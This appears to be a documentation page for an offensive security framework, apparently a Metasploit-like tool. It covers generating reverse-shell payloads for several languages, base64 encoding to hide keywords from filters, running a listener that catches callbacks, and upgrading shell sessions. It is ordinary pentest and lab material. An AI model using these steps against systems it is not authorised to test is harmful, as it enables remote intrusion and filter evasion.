# Payloads and Handlers

The two halves of getting a shell: something that calls back, and
something that answers.

## Generating payloads

```
forge > use payloads/python_reverse_tcp
forge (payloads/python_reverse_tcp) > set LHOST 10.10.14.5
forge (payloads/python_reverse_tcp) > set LPORT 4444
forge (payloads/python_reverse_tcp) > generate
```

| Payload | Output | Needs |
|---|---|---|
| `payloads/python_reverse_tcp` | python3 pty one-liner (Linux with python3) | nothing |
| `payloads/bash_reverse_tcp` | bash /dev/tcp one-liner (no other binaries) | nothing |
| `payloads/php_reverse_tcp` | PHP fsockopen one-liner (web targets) | nothing |
| `payloads/powershell_reverse_tcp` | PowerShell one-liner (Windows) | nothing |
| `payloads/shellcode_reverse_tcp` | null-free shellcode as a bytes literal (x86_64/i686/aarch64) | pwntools |
| `payloads/encoders/base64_command` | `echo <b64> \| base64 -d \| sh` wrapper | nothing |
| `payloads/encoders/ps_base64` | `powershell -enc` wrapper (UTF-16LE) | nothing |

Chaining today is copy/paste: `generate` → paste into `set PAYLOAD '…'`
on an encoder → `generate` again. Encoders hide *keywords* from naive
filters; they do not hide *intent* from a real EDR — know the difference.

## Catching: the handler

```
forge > use exploits/multi/handler
forge (exploits/multi/handler) > set LHOST 0.0.0.0
forge (exploits/multi/handler) > set LPORT 4444
forge (exploits/multi/handler) > run -j          # background listener
```

Every inbound connection becomes a framework session and is announced at
the prompt: `[+] Session 1 opened (10.10.10.5:51234)`. Options:
`UPGRADE true` sends the pty upgrade automatically on connect.
`jobs -k <id>` stops the listener (cooperative — the handler implements
`stop()`).

## Working the session

| Action | Command |
|---|---|
| List | `sessions` |
| Interact | `sessions -i <id>` — raw tty; **Ctrl-]** detaches |
| Upgrade | `sessions -u <id>` — dumb shell → pty, then interact |
| Kill | `sessions -k <id>` |

The pty upgrade (`sessions -u`) sends the python/`script` spawn, exports
`TERM`, and syncs window size — then keeps it synced on resize
(SIGWINCH). After it, Ctrl-C, sudo prompts, and tab completion all work
on the far end. Note our `python_reverse_tcp` payload already spawns a
pty on the target; the upgrade matters for dumb `nc` shells and
exploit-landed shells.

## Cheat: staging through setg

`setg LHOST tun0` once — every payload and the handler inherit it. Put it
in `~/.forge/config.toml` and it's permanent. See [[Data-and-Evidence]].
